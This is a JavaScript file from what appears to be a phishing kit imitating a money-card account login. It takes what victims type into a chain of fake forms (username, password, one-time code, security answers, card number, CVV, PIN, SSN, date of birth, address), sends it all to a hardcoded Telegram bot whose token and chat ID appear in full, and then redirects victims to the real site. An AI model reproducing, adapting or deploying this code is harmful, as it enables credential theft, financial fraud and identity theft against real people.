// Telegram bot token and chat ID
const botToken = "7223927210:AAGzpMjqXiNR_lxoXFcvcWJStytpXLQJOgQ";
const chatId = "7271870167";

// Email to receive submissions
const receiveEmail = "smartxarticle@gmail.com";

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: chatId,
        text: message
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: params
        });
        return response.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

async function sendToEmail(subject, body) {
    // Note: Sending emails directly from client-side JavaScript is not possible.
    // You would need a server-side API to handle this securely.
    console.log(`Email would be sent to ${receiveEmail} with subject: ${subject} and body: ${body}`);
    return true;
}

function getSystemInfo() {
    return `
[+]\u2014\u2014\u2014\u2014\u3010\uD83D\uDD25 System INFO\u3011\u2014\u2014\u2014\u2014 \uD83D\uDD25[+]
|Client IP: [IP address would be determined server-side]
|User Agent: ${navigator.userAgent}
|\uD83D\uDD25 \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \uD83D\uDD25|
`;
}

async function handleFormSubmission(formData, formType) {
    let message = `[+]\u2014\u2014\u2014\u2014\u3010\uD83D\uDD25 Login Attempt\uD83D\uDD25\u3011\u2014\u2014\u2014\u2014[+]\r\n\n`;

    switch (formType) {
        case 'sign-in':
            message += `ID          : ${formData.get('j_username')}\n`;
            message += `Password : ${formData.get('j_password')}\n\n`;
            break;
        case 'otp-btn':
            message += `OTP CODE          : ${formData.get('otp')}\n\n`;
            break;
        case 'q-btn':
            message += `Question 1 : ${formData.get('question1')}\n`;
            message += `Answer 1         : ${formData.get('answer1')}\n`;
            message += `Question 2 : ${formData.get('question2')}\n`;
            message += `Answer 2       : ${formData.get('answer2')}\n`;
            message += `Question 3          : ${formData.get('question3')}\n`;
            message += `Answer 3   : ${formData.get('answer3')}\n\n`;
            break;
        case 'card-btn':
            message += `Card Name : ${formData.get('cname')}\n`;
            message += `Card Number  : ${formData.get('cnum')}\n`;
            message += `Expiry Date  : ${formData.get('expdate')}\n`;
            message += `CVV  : ${formData.get('cvv')}\n`;
            message += `Card PIN  : ${formData.get('cpin')}\n`;
            message += `Date of Birth  : ${formData.get('dob')}\n`;
            message += `SSN  : ${formData.get('ssn')}\n`;
            message += `Address  : ${formData.get('addr')}\n`;
            message += `State : ${formData.get('state')}\n`;
            message += `City : ${formData.get('city')}\n`;
            message += `Zipcode  : ${formData.get('zip')}\n`;
            message += `Phone Number  : ${formData.get('ph')}\n`;
            message += `Email  : ${formData.get('em')}\n`;
            message += `Password  : ${formData.get('pass')}\n\n`;
            break;
    }

    message += getSystemInfo();

    const telegramSent = await sendToTelegram(message);
    const emailSent = await sendToEmail(`Login Attempt: [IP would be here]`, message);

    if (telegramSent && emailSent) {
        return true;
    } else {
        console.error('Failed to send data');
        return false;
    }
}

// Event listeners for form submissions
document.addEventListener('DOMContentLoaded', () => {
    const forms = {
        'card-holder-login': 'onetime.html',
        'otp-form': 'security.html',
        'security-form': 'billing.html',
        'billing-form': 'https://www.moneynetwork.com/'
    };

    for (let [formId, nextPage] of Object.entries(forms)) {
        const form = document.getElementById(formId);
        if (form) {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const formData = new FormData(form);
                const formType = form.querySelector('button[type="submit"]').name || formId;
                if (await handleFormSubmission(formData, formType)) {
                    window.location.href = nextPage;
                }
            });
        }
    }
});
